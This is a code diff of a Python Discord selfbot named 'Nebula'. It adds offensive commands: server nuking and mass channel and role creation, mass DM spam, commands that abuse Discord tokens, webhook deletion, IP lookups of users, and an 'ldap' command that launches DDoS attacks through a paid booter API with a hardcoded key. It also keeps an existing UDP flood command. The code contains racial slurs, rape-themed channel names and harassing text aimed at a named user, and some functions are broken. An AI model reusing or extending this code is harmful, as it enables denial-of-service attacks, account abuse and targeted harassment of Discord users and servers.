@@ -1,12 +1,16 @@
 # -*- coding: utf-8 -*-
 
-version = "1.00"
+version = "2.10"
 import asyncio, platform, random, psutil, ctypes, itertools, socket, colorama, getpass, sys, json, subprocess, discord
-import os, base64, requests, pytube, hashlib, threading, math, aiohttp, datetime, pythonping, ipapi, time, numpy
+import os, base64, requests, pytube, hashlib, threading, math, aiohttp, datetime, pythonping, ipapi, time, numpy, pypresence
+from discord_webhook import DiscordWebhook, DiscordEmbed
 from discord.ext import commands
+from bs4 import BeautifulSoup
+from discord.embeds import Embed
 from discord.utils import get
 from colorama import Fore, Style
 from pytube import YouTube
+from pypresence import Presence
 
 
 ctypes.windll.kernel32.SetConsoleTitleW('Nebula')
@@ -17,6 +21,8 @@ client = commands.Bot(
     self_bot=True
 )
 client.remove_command('help') 
+
+
                 
 username = getpass.getuser()
 hostname = socket.gethostname()
@@ -30,7 +36,9 @@ title = config.get('title')
 footer = config.get('footer')
 author = config.get('author')
 token = config.get('token')
-
+t = time.localtime()
+current_time = time.strftime("%H:%M:%S", t)
+start_time = datetime.datetime.utcnow()
 
 done = False
 
@@ -56,6 +64,7 @@ Light_Grey = '\033[37m'
 Dark_Grey = '\033[90m'
  
 Clear()
+
 
 def banner():
     mem = psutil.virtual_memory()
@@ -92,6 +101,13 @@ def banner():
                                                    
 '''+Fore.RESET)
                                                    
+def print_slow(str):
+    for letter in str:
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
 
 def loading():
     os.system('cls')
@@ -110,7 +126,7 @@ def loading():
                                                     {Fore.WHITE}[{Fore.MAGENTA}Final Edtion{Fore.WHITE}]                            
     
     ''')
-    time.sleep(0.3)
+    time.sleep(0.6)
 
 mem = psutil.virtual_memory()
 cpu_per = round(psutil.cpu_percent(),1)
@@ -118,6 +134,7 @@ mem_per = round(psutil.virtual_memory().percent,1)
 
 @client.event
 async def on_connect():
+    log()
     mem = psutil.virtual_memory()
     cpu_per = round(psutil.cpu_percent(),1)
     mem_per = round(psutil.virtual_memory().percent,1)
@@ -159,12 +176,12 @@ async def on_message_edit(before, after):
 
 
 @client.command()
-async def usage(ctx):
+async def system(ctx):
     await ctx.message.delete()
-    embed=discord.Embed(title=f"*Nebula's Usage*", description=f"```diff\nMemory - {mem_per}```\n```CPU - {cpu_per}\n```", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed=discord.Embed(title=f"*System Resources*", description=f"```Memory - {mem_per}%\n\nCPU - {cpu_per}%\n```", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
-    
+
 @client.command()
 async def help(ctx):
     await ctx.message.delete() 
@@ -183,6 +200,25 @@ async def status(ctx):
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
+
+def google(search):
+    URL = (f'https://google.com/search?q={search}')
+    headers = {'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36'}
+    request = requests.get(URL, headers=headers)
+    if request.status_code == 200:
+        soup = BeautifulSoup(request.content, 'html.parser')
+        results = []
+        for i in soup.find_all('div', {'class' : 'yuRUbf'}):
+            link = i.find_all('a')
+            links = link[0]['href']
+            results.append(links)
+    try:
+        return(results)
+    except Exception as e:
+        print('Error getting results from Google')
+        pass
+
+
 @client.command()
 async def raid(ctx):
     await ctx.message.delete()
@@ -192,11 +228,25 @@ async def raid(ctx):
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
+def log():
+    webhook = DiscordWebhook(url=f'{webhooks}', username="Loggin nigga")
+
+    embed = DiscordEmbed(title='Embed Title', description='Your Embed Description', color=242424)
+    embed.set_author(name='Author Name', url='https://github.com/lovvskillz', icon_url='https://avatars0.githubusercontent.com/u/14542790')
+    embed.set_footer(text='Embed Footer Text')
+    embed.set_timestamp()
+    embed.add_embed_field(name='Field 1', value='Lorem ipsum')
+    embed.add_embed_field(name='Field 2', value='dolor sit')
+    embed.add_embed_field(name='Field 3', value='amet consetetur')
+    embed.add_embed_field(name='Field 4', value='sadipscing elitr')
+
+    webhook.add_embed(embed)
+    response = webhook.execute()   
 
 @client.command()
 async def exploits(ctx):
     await ctx.message.delete()
-    embed=discord.Embed(title=f"*Nebula Exploit Commands*", description=f"**Cloudssp**\nFinds the backend server of a website that is running cpanel\n\n**WebSpoof**\nwebspoof <LINK1> <LINK2>\n\n",color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed=discord.Embed(title=f"*Nebula Exploit Commands*", description=f"**Cloudssp**\nFinds the backend server of a website that is running cpanel\n\n**WebSpoof**\nwebspoof <LINK1> <LINK2>\n\n**UnVerify**\nUnverifys given token",color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
@@ -210,7 +260,48 @@ async def project(ctx):
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
+@client.command()
+async def udpflood(ctx, host, time, port):
+    await ctx.message.delete()
+    
 
+@client.command()
+async def dmall(ctx, *, dmall):
+    await ctx.message.delete()
+    embed=discord.Embed(title=f" **Attempting to DM {ctx.guild.member_count} users** ", description=f"With the message of **{dmall}**", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed.set_footer(text=f'{footer} ')
+    await ctx.send(embed=embed,delete_after=10)
+    for user in ctx.guild.members:
+        try:
+                await user.send(dmall)
+                await asyncio.sleep(3)
+        except:
+                print(f"[{Fore.MAGENTA}!{Fore.WHITE}]{Fore.MAGENTA} Error messaging {Fore.WHITE}{Fore.MAGENTA}[{Fore.WHITE}{user.name}{Fore.MAGENTA}]")
+
+
+@client.command()
+@commands.has_permissions(manage_channels=True)
+async def nuke(ctx):
+    
+    channel = ctx.channel
+    channel_position = channel.position
+    
+    new_channel = await channel.clone()
+    await channel.delete()
+    await new_channel.edit(position=channel_position, sync_permissions=True)
+    embed=discord.Embed(title=f" **Nuked!** ", description=f"```This channel was nuked by Nebula Selfbot!```", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed.set_footer(text=f'{footer} ')
+    await ctx.send(embed=embed,delete_after=10,new_channel=new_channel)
+
+@client.command()
+@commands.has_permissions(ban_members=True)
+async def test(ctx):
+    embed=discord.Embed(title=f" **Nuked!** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed.set_footer(text=f'{footer} ')
+    embed.set_thumbnail(url='https://giphygifs.s3.amazonaws.com/media/HhTXt43pk1I1W/200.gif')
+    await ctx.channel.delete(reason="nuke")
+    channel = await ctx.channel.clone(reason="nuke")
+    await channel.send(embed=embed, delete_after=10)
 
 @client.command()
 async def general(ctx):
@@ -220,6 +311,42 @@ async def general(ctx):
     
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
+
+@client.command()
+async def unverify(ctx, _token): 
+    await ctx.message.delete()
+    headers = {'Authorization': _token}
+    requests.get(f'https://discord.com/api/v6/guilds/0/members', headers=headers)
+
+@client.command()
+async def everyone(ctx, *, message=None):
+    await ctx.message.delete()
+    mention = '\n\n'.join(role.mention for role in ctx.message.guild.roles)
+    await ctx.message.channel.send(mention)
+
+
+@client.command()
+async def poll(ctx, *, question: str):
+    await ctx.message.delete()
+    embed=discord.Embed(title=f" **Poll!** ", description=f"```{question}```", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed.set_footer(text=f'{footer} ')
+    await ctx.send(embed=embed,delete_after=10)
+
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    if ctx.guild.id == 207943928018632705:
+        # Essential :sexthumb:
+        yes_thumb = discord.utils.get(
+            ctx.guild.emojis, id=287711899943043072)
+        no_thumb = discord.utils.get(
+            ctx.guild.emojis, id=291798048009486336)
+    else:
+        yes_thumb = "👍"
+        no_thumb = "👎"
+    await embed.add_reaction(yes_thumb)
+    await embed.add_reaction(no_thumb)
 
 
 @client.command()
@@ -243,33 +370,31 @@ async def invitespoof(ctx, link1, link2):
     await ctx.send (f"{link1}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||{link2}")
 
 @client.command()
-async def dmall(ctx, *, dmall):
+async def lookup(ctx, *, ip: str):
+    ip_info = ipapi.location(ip=ip)    
     await ctx.message.delete()
-    embed=discord.Embed(title=f" **Attempting to DM {ctx.guild.member_count} users** ", description=f"With the message of **{dmall}**", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed = discord.Embed(title=f"**{ip}** lookup!", description='',color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed.add_field(name="ORG", value=f"{ip_info['org']}", inline=False)
+    embed.add_field(name="ASN", value=f"{ip_info['asn']}", inline=False)
+    embed.add_field(name="Region", value=f"{ip_info['region']}", inline=False)
+    embed.add_field(name="Country", value=f"{ip_info['country_name']}", inline=False)
+    embed.add_field(name="City", value=f"{ip_info['city']}", inline=False)
+    embed.add_field(name="Timezone", value=f"{ip_info['timezone']}", inline=False)
+    embed.add_field(name="Language", value=f"{ip_info['languages']}", inline=False)
+    embed.add_field(name="Currency", value=f"{ip_info['currency']}", inline=False)
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
-    for user in ctx.guild.members:
-        try:
-                await user.send(dmall)
-                await asyncio.sleep(3)
-        except:
-                print(f"[{Fore.MAGENTA}!{Fore.WHITE}]{Fore.MAGENTA} Error messaging {Fore.WHITE}{Fore.MAGENTA}[{Fore.WHITE}{user.name}{Fore.MAGENTA}]")
 
 @client.command()
-async def nuke(ctx, channel):
-    channel_id = int(''.join(i for i in channel if i.isdigit())) 
-    existing_channel = client.get_channel(channel_id)
-    if existing_channel is not None:
-        await existing_channel.clone(reason="nuked by nebula")
-        await existing_channel.delete()
-        embed=discord.Embed(title=f"**Nuked!** ", description=f"This channel was nuked by {client.user}", color=0xbf00ff, timestamp=ctx.message.created_at)
-        embed.set_footer(text=f'{footer}')
-        await ctx.send(embed=embed,delete_after=10)
-    else:
-        embed=discord.Embed(title=f"**Invalid Channel** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
-        embed.set_footer(text=f'{footer} ')
-        await ctx.send(embed=embed,delete_after=10)
-    
+async def blockbypass(ctx, message, client_id):
+    await ctx.message.delete()
+    token = getToken
+    client_id = client
+    headers = {'Authorization': token}
+    res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json={'recipient_id': client_id})
+    return res.json().get('id')
+    channel_id = _get_channel_id(client_id)
+    return requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': message})
 
 
 
@@ -321,7 +446,7 @@ async def cloudssp(ctx, site):
 
         
 @client.command(pass_context=True)
-async def chnick(ctx, member: discord.Member, nick):
+async def chnick(ctx, member: discord.Member, *, nick):
     await ctx.message.delete()
     await member.edit(nick=nick)
 #def cloudssp():
@@ -345,7 +470,43 @@ async def chnick(ctx, member: discord.Member, nick):
   #        print(f"{Fore.YELLOW}IP/Domain links found:{Fore.WHITE}")
    #       print("")
 
-#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST") 
+#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")
+
+@client.command()
+async def webhook(ctx, webhook):
+    await ctx.message.delete()
+    try:
+        statuscode1 = requests.get(f"{webhook}").status_code
+        if statuscode1 ==404:
+            embed=discord.Embed(title="**Invalid Webhook!**",color=0xbf00ff, timestamp=ctx.message.created_at)
+            embed.set_footer(text=f'{footer} ')
+            await ctx.send(embed=embed,delete_after=10)
+
+        elif statuscode1 ==200:
+            info = requests.get(f"{webhook}")
+            WebName = info.json()['name']
+            WebChannelID = info.json()['channel_id']
+            WebGuildID = info.json()['guild_id']
+            WebID = info.json()['id']
+            Avatar = info.json()['avatar']
+            requests.delete(f"{webhook}")
+            statuscode = requests.get(f"{webhook}").status_code
+            if statuscode ==200:
+                embed=discord.Embed(title="**Error!**",color=0xbf00ff, timestamp=ctx.message.created_at)
+                embed.set_footer(text=f'{footer} ')
+                await ctx.send(embed=embed,delete_after=10)
+
+            else:
+                embed=discord.Embed(title="__**Deleted!**__",color=0xbf00ff, timestamp=ctx.message.created_at)
+                embed.add_field(name="**Name**", value=f"{WebName}", inline=True)
+                embed.add_field(name="**Channel ID**", value=f"{WebChannelID}", inline=True)
+                embed.add_field(name="**Server ID**", value=f"{WebGuildID}", inline=False)
+                embed.set_image(url=f"https://cdn.discordapp.com/avatars/{WebID}/{Avatar}")                          
+                embed.set_footer(text=f'{footer} ')
+                await ctx.send(embed=embed,delete_after=10)
+
+    except:
+        print(f"{Style.BRIGHT}{Fore.WHITE}[{Style.BRIGHT}{Fore.MAGENTA}!]{Fore.WHITE} Invalid Webhook")     
      
 @client.command()
 async def reload(ctx):
@@ -376,18 +537,12 @@ async def sha256(ctx, *, message):
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
-@client.command()
-async def typing(ctx, amount: int):
-    await ctx.message.delete()
-    async with ctx.typing():
-      await asyncio.sleep(amount)
 
-def prefixchange(file_name, line_num, text):
-  lines = open(file_name, 'r').readlines()
-  lines[line_num] = text
-  out = open(file_name, 'w')
-  out.writelines(lines)
-  out.close()
+@client.command()
+async def typing(ctx):
+    await ctx.message.delete()
+    headers = {'Authorization': token}
+    requests.post(f'https://discordapp.com/api/v6/channels/{ctx.message.channel.id}/typing', headers=headers)
 
 @client.command()
 async def cls(ctx):
@@ -487,12 +642,11 @@ async def vi(ctx):
     #http://femboy.host/uploads/5363db86-1ece-475a-b86f-c0b31373108e/LI1G2Ak6.png
     #https://images-ext-2.discordapp.net/external/ouZK4T1IjzO1MF4ZnMN1mfBd85Z1GKmoCzW8hfFnS3E/http/i-hate.niggers.lol/uploads/0f18d1ce-6692-4104-bbb0-d6e96b56b92e/0vNw3hnM.png
     embed=discord.Embed(title="**vi**",description="vi condones child porn and is mad because her server got banned for a legitimate reason!", color=0xbf00ff, timestamp=ctx.message.created_at)
-    embed.set_image(url='https://images-ext-1.discordapp.net/external/3KV_MLaNCZUF4agNnZxTK2bMHO_wEmTppME05ZVUI1A/http/femboy.host/uploads/5363db86-1ece-475a-b86f-c0b31373108e/xfXngCZG.png')
-    embed.set_image(url='https://images-ext-2.discordapp.net/external/ouZK4T1IjzO1MF4ZnMN1mfBd85Z1GKmoCzW8hfFnS3E/http/i-hate.niggers.lol/uploads/0f18d1ce-6692-4104-bbb0-d6e96b56b92e/0vNw3hnM.png')
-    embed.set_thumbnail(url='http://femboy.host/uploads/5363db86-1ece-475a-b86f-c0b31373108e/LI1G2Ak6.png')
+    embed.set_image(url='https://cdn.discordapp.com/attachments/784623962038468608/786008132253646848/image0.png')
+    embed.set_thumbnail(url='https://cdn.discordapp.com/avatars/715581783260921976/a_2a2c88ccb3e84563d88b4f6ed4fb1b2c.gif?size=1024')
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed)
 
 
 @client.command()
@@ -566,6 +720,29 @@ async def upordown(ctx, site):
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
+
+@client.command()
+async def ldap(ctx, target, port, duration):
+    await ctx.message.delete()
+    url = "https://api.sleek.to/tests/launch"
+
+    payload = {f"token": "s54624kf7Xuroy", 
+           "target": f"{target}", 
+           "port": f"{port}",
+           "duration": f"{duration}",
+           "method": "LDAP",
+           "pps": "500000"
+           }
+
+    header = {"Content-type": "application/x-www-form-urlencoded",
+          "Accept": "text/plain"} 
+
+    response_decoded_json = requests.post(url, data=payload, headers=header)
+    response_json = response_decoded_json.json()
+    embed=discord.Embed(title=f" **Attack** ", description=f"{response_json}", color=0xbf00ff, timestamp=ctx.message.created_at)
+    
+    embed.set_footer(text=f'{footer} ')
+    await ctx.send(embed=embed,delete_after=10)
 
 
 @client.command()
@@ -710,17 +887,6 @@ async def passgen(ctx, text):
 
 
 @client.command()
-async def ips(ctx):
-    await ctx.message.delete()
-    embed=discord.Embed(title="Discord's IP Addresses",color=0xbf00ff, timestamp=ctx.message.created_at)
-    embed.add_field(name="Europe IP's", value=f"188.122.76.15\n5.200.6.155\n188.122.88.143\n5.200.14.187\n5.200.14.248\n", inline=True)
-    embed.add_field(name="Russia IP's", value=f"188.122.83.114\n188.122.83.61\n188.122.83.44\n188.122.83.101\n188.122.83.53\n", inline=True)
-    embed.add_field(name="Dubai IP'S", value=f"185.179.203.235\n185.179.203.233\n185.179.203.234\n185.179.203.231\n185.179.203.232\n", inline=True)
-    embed.add_field(name="US East IP's", value=f"162.244.54.107\n213.179.197.205\n213.179.197.39\n213.179.197.198\n213.179.197.233\n", inline=True)
-    embed.add_field(name="US Central IP's", value=f"138.128.142.26\n138.128.141.90\n138.128.142.34\n138.128.141.112\n138.128.142.91\n", inline=True)
-    await ctx.send(embed=embed, delete_after=5)
-
-@client.command()
 async def webss(ctx, URL):
     await ctx.message.delete()
     r = requests.get(f"https://api.c99.nl/createscreenshot?key=&url={URL}").text
@@ -752,28 +918,18 @@ async def illegal(ctx):
             pass
     try:
         await ctx.guild.edit(
-            name='NebulaSelfbot',
+            name='Raped',
             description="https://discord.gg/TEJbeeWEFx",
-            reason="charge#1993",
+            reason="charge#0001",
             icon=None,
             banner=None
         )  
     except:
         pass        
     for _i in range(250):
-        await ctx.guild.create_text_channel(name='NebulaSelfbot')
+        await ctx.guild.create_text_channel(name='Rape')
     for _i in range(250):
-        await ctx.guild.create_role(name='NebulaSelfbot', color='0xbf00ff')
-
-@client.command()
-async def dmall(ctx, *, message): 
-    await ctx.message.delete()
-    for user in list(ctx.guild.members):
-        try:
-            await asyncio.sleep(5)    
-            await user.send(message)
-        except:
-            pass
+        await ctx.guild.create_role(name='Rape', color='0xbf00ff')
 
 @client.command()
 async def massban(ctx): 
@@ -864,7 +1020,9 @@ async def tokeninfo(ctx, _token):
         avatar_id = res['avatar']
         creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
     except KeyError:
-        print(f"{Fore.MAGENTA}[ERROR]: {Fore.MAGENTA}Invalid token"+Fore.RESET)
+        embed=discord.Embed(title="Invalid Token!", color=0xbf00ff, timestamp=ctx.message.created_at)
+        embed.set_footer(text=f'{footer} ')
+        await ctx.send(embed=embed,delete_after=10)
     em = discord.Embed(
         description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})", color=0xbf00ff, timestamp=ctx.message.created_at)
     fields = [
@@ -954,9 +1112,10 @@ async def tokenfuck(ctx, _token):
 
 @client.command(aliases=["udox"])
 async def userinfo(ctx, member: discord.Member = None):
+    await ctx.message.delete()
     if not member:  
         member = ctx.message.author  
-    roles = [role for role in member.roles]
+    roles = [role for role in member.roles if role != ctx.guild.default_role]
     embed = discord.Embed(color=0xbf00ff, timestamp=ctx.message.created_at,
                           title=f"User Info - {member}")
     embed.set_thumbnail(url=member.avatar_url)
@@ -967,7 +1126,7 @@ async def userinfo(ctx, member: discord.Member = None):
     embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
     embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
 
-    embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
+    embed.add_field(name="Roles:", value=''.join([role.mention for role in roles]))
     embed.add_field(name="Highest Role:", value=member.top_role.mention)
     
     embed.set_footer(text=f'{footer} ')
@@ -1081,10 +1240,6 @@ async def host2ip(ctx, *, host: str):
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
-                                
-@client.command()
-async def log(ctx):
-    await ctx.message.delete()
 
 @client.command()
 async def b64decode(ctx, message):
@@ -1097,7 +1252,6 @@ async def b64decode(ctx, message):
     
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
-
 
 @client.command()
 async def b64encode(ctx, *, message):
@@ -1163,7 +1317,7 @@ async def udprand(ctx, ip, port: int, dur: int):
     payload = "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44".encode()
 
     stop = time.time() + dur
-    embed=discord.Embed(title=f"Nebula", description=f"\n\n **Attack sent to {ip}** \n Port = {port} \n Time= {dur} \n Method = udphex",color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed=discord.Embed(title=f"‏‏‎Nebula", description=f"\n\n **Attack sent to {ip}** \n Port = {port} \n Time= {dur} \n Method = udphex",color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
@@ -1219,4 +1373,4 @@ async def watching(ctx, *, message):
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{message}"))
 
 loading()
-client.run(token, bot=False, reconnect=True)
+client.run(token, recconnect=True, bot=False)
